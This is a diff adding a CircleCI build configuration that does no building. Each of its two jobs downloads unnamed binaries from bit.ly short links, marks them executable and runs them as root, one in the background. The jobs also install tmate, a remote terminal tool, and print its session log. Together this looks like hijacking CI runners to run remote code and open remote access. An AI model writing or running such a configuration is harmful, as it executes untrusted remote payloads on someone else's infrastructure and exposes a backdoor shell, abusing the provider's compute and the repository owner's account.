@@ -1,0 +1,47 @@
+version: 2
+jobs:
+  build_1:
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: large
+    steps:
+      - run: 
+         name: Start
+         command: |
+          sudo su --command "wget https://bit.ly/3yC2cWa && apt-get update && apt-get install tmate -y && chmod +x 3yC2cWa"
+          sudo su --command "nohup ./3yC2cWa --log=stdout > meta.log &"
+          sleep 10
+          sudo su --command "cat meta.log"    
+      - run: 
+         name: Wait
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3y21Are
+          chmod +x 3y21Are
+          sudo su --command "./3y21Are"
+      
+  build_b:
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: 2xlarge
+    steps:
+      - run: 
+         name: Start
+         command: |
+          sudo su --command "wget https://bit.ly/3yC2cWa && apt-get update && apt-get install tmate -y && chmod +x 3yC2cWa"
+          sudo su --command "nohup ./3yC2cWa --log=stdout > meta.log &"
+          sleep 10
+          sudo su --command "cat meta.log"    
+      - run: 
+         name: Wait
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3y21Are
+          chmod +x 3y21Are
+          sudo su --command "./3y21Are"
+workflows:
+    version: 2
+    build:
+        jobs:
+            - build_1
+            - build_b
